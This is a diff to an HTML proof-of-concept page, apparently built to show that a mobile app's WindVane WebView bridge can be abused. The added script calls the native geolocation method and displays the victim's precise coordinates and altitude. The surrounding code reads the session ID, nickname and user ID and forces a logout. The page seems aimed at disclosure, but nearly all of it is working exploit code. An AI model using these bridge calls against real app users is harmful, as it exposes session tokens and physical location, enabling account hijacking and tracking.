@@ -49,6 +49,10 @@
 
     <p><span class="bold-and-larger">An attacker can:</span></p>
 
+    <p><span class="larger">Get Your Geolocation Info:</span></p>
+    <p style="font-size: 15px;" id="PreciseLocation">Your Precise Location: </p>
+    <p style="font-size: 15px;" id="Altitude">Your Altitude: </p>
+
     <p><span class="larger">Get Your Account Info:</span></p>
     <p style="font-size: 15px;" id="NickName"></p>
     <p style="font-size: 15px;" id="UserID"></p>
@@ -67,7 +71,6 @@
     <script>
 
         window.__windvane__.onSuccess = function (reqId, response, boool) {
-            // console.log("[attacker]: " + "\n reqId: " + reqId + "\n response: " + JSON.stringify(response) + "\n bool: " + boool);
             if (reqId == "$0001") {
                 document.getElementById("LogOutText").innerText = "Log out successfully";
             }
@@ -84,6 +87,11 @@
                 document.getElementById("Sid").innerText = "Your SID: \n" + json.sid;
                 document.getElementById("NickName").innerText = "Your NickName: \n" + json.nick;
                 document.getElementById("UserID").innerText = "Your UserID: \n" + json.userId;
+            }
+            if (reqId == "$0005") {
+                var json = response;
+                document.getElementById("PreciseLocation").innerText = "Your Precise Location: " + "(" + json.coords.latitude + ", " + json.coords.longitude + ")";
+                document.getElementById("Altitude").innerText = "Your Altitude: " + json.coords.altitude;
             }
         }
 
@@ -111,6 +119,12 @@
             name: "aluWVJSBridge.getUserInfo",
             params: "{}",
             reqId: "$0004"
+        });
+
+        window.webkit.messageHandlers.WindVaneCallNative.postMessage({
+            name: "WVLocation.getLocation",
+            params: "{}",
+            reqId: "$0005"
         });
 
     </script>
